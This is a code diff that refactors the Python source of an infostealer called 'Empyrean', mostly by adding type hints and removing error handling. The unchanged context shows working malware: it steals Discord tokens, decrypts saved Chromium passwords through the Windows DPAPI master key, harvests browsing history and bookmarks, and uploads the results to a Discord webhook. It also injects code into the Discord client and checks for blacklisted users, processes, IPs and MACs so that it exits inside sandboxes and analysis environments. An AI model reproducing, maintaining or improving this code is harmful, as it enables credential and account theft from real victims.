@@ -36,7 +36,7 @@ def main() -> None:
     system(webhook)
 
 class discord():
-    def __init__(self, webhook) -> None:
+    def __init__(self, webhook: str) -> None:
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -115,7 +115,7 @@ class discord():
 
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
     
-    def upload_accounts(self, webhook) -> None:
+    def upload_accounts(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
             
         for token in self.tokens:
@@ -203,18 +203,16 @@ class discord():
             
             webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
             
-    def decrypt_val(self, buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return "Failed to decrypt password"
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        
+        return decrypted_pass
     
-    def get_master_key(self, path) -> str:
+    def get_master_key(self, path: str) -> str:
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -222,9 +220,10 @@ class discord():
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        
         return master_key
 
-    def grabTokens(self):
+    def grabTokens(self) -> None:
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -374,7 +373,7 @@ class chromium():
                     webhook.send(file=File('.\\' + name + '-vault.zip'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
                     os.remove('.\\' + name + '-vault.zip')
                     
-    def get_master_key(self, path) -> str:
+    def get_master_key(self, path: str) -> str:
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -384,18 +383,16 @@ class chromium():
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
-    def decrypt_password(self, buff, master_key):
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except:
-            return None
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
         
-    def password(self, name, path, profile):
+        return decrypted_pass
+        
+    def password(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
@@ -413,7 +410,7 @@ class chromium():
         conn.close()
         os.remove(vault)
         
-    def web_history(self, name, path, profile):
+    def web_history(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
@@ -436,7 +433,7 @@ class chromium():
         conn.close()
         os.remove(vault)
         
-    def search_history(self, name, path, profile):
+    def search_history(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
@@ -454,7 +451,7 @@ class chromium():
         conn.close()
         os.remove(vault)
         
-    def bookmarks(self, name, path, profile):
+    def bookmarks(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\Bookmarks'
         if not os.path.isfile(path):
             return
@@ -493,7 +490,7 @@ class system():
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
         
-    def get_display_name(self):
+    def get_display_name(self) -> str:
         GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
         NameDisplay = 3
     
@@ -505,7 +502,7 @@ class system():
         
         return nameBuffer.value
     
-    def get_disk_space(self):
+    def get_disk_space(self) -> str:
         disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
         for part in psutil.disk_partitions(all=False):
             if os.name == 'nt':
@@ -515,14 +512,14 @@ class system():
         
         return disk
     
-    def get_hwid(self):
+    def get_hwid(self) -> str:
         p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
         
         return hwid
 
 class injection:
-    def __init__(self, webhook: str):
+    def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord', 
@@ -545,7 +542,7 @@ class injection:
                     f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                     self.start_discord(dir)
                 
-    def get_core(self, dir: str):
+    def get_core(self, dir: str) -> tuple:
         for file in os.listdir(dir):
             if re.search(r'app-+?', file):
                 modules = dir + '\\' + file + '\\modules'
@@ -558,7 +555,7 @@ class injection:
                         
                         return core, file
                     
-    def start_discord(self, dir: str):
+    def start_discord(self, dir: str) -> None:
         update = dir + '\\Update.exe'
         executable = dir.split('\\')[-1] + '.exe'
         
@@ -572,10 +569,10 @@ class injection:
                             subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             
 class debug:
-    def __init__(self):
+    def __init__(self) -> None:
         if self.checks(): self.self_destruct()
     
-    def checks(self):
+    def checks(self) -> bool:
         debugging = False 
         
         self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
@@ -591,7 +588,7 @@ class debug:
   
         return debugging
 
-    def check_process(self):
+    def check_process(self) -> bool:
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                 try:
@@ -599,14 +596,14 @@ class debug:
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
      
-    def get_network(self):
+    def get_network(self) -> bool:
         ip = requests.get('https://api.ipify.org').text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         
         if ip in self.blackListedIPS: return True	
         if mac in self.blackListedMacs: return True
         
-    def get_system(self):
+    def get_system(self) -> bool:
         hwid = (subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read() + subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read()).decode().split("\n")[1]     
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
@@ -615,7 +612,7 @@ class debug:
         if username in self.blackListedUsers: return True
         if hostname in self.blackListedPCNames: return True
     
-    def self_destruct(self):
+    def self_destruct(self) -> None:
         sys.exit()        
 
 if __name__ == "__main__":
